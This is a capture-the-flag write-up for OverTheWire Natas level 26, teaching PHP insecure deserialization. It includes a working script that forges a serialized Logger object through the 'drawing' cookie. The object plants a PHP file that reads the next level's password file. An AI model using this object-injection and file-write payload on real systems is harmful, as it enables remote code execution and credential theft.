# OverTheWire Natas 25–26 Write-up

## Overview

Natas Level 26 involves PHP object `serialization` and `deserialization`.

The important part of the source code is the following:

```php
$drawing = unserialize(base64_decode($_COOKIE["drawing"]));
```

- The application takes the drawing cookie, Base64-decodes it, and then passes the result to PHP's unserialize() function.

- This is significant because unserialize() can reconstruct PHP objects from serialized user-controlled data.

### Analyzing the Logger Class

The application contains a Logger class with three private properties:

```php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
}
```

- The constructor initializes these properties. Of particular interest are $logFile and $exitMsg.

*The goal is to create a serialized Logger object with values that cause the application to write our controlled PHP code to a file that can later be accessed through the web server.*

I created the following PHP script to generate the serialized object:

```php

<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        $this->logFile =
            "/var/www/natas/natas26/img/exploit.php";

        $this->initMsg = "";

        $this->exitMsg =
            "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
    }
}

$logger = new Logger();

echo base64_encode(serialize($logger));

?>
```

- Running this script produces a Base64-encoded serialized object.

The resulting value begins with:

```
Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRml....
```

### Understanding the Payload

The important values in the object are:

```php
$this->logFile =
    "/var/www/natas/natas26/img/exploit.php";
```

- This specifies where the generated PHP file should be written.

The second important value is:

```php
$this->exitMsg =
    "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
```

When the application processes the object, this PHP code is written to the target file.

The vulnerable operation is:

`unserialize(base64_decode($_COOKIE["drawing"]));`


Because the serialized object is supplied through the drawing cookie, the application reconstructs our Logger object with the controlled property values.

### Supplying the Serialized Object

1. Open the browser's Developer Tools and locate the drawing cookie.

2. Replace its existing value with the Base64-encoded serialized object generated by the PHP script.

3. After setting the cookie, refresh the page.

4. The application processes the object and creates the PHP file under the specified path.

### Accessing the Generated File

- The generated file is located inside the web-accessible img directory.

For example:

http://natas26.natas.labs.overthewire.org/img/exploit.php


- Opening this file causes the PHP code stored in it to execute.

The payload reads:

/etc/natas_webpass/natas27

and prints the password for the next level.

*The output is the Natas 27 password.*

### Lessons Learned

- This level demonstrates several important concepts:

- PHP serialization and deserialization

- How unserialize() can reconstruct objects from user-controlled input

- The security risks of deserializing untrusted data

- PHP private-property serialization

- Base64 encoding and decoding

- Cookie manipulation using browser Developer Tools

- How file-writing functionality can become dangerous when combined with controlled object properties

- The importance of understanding the application's source code and data flow
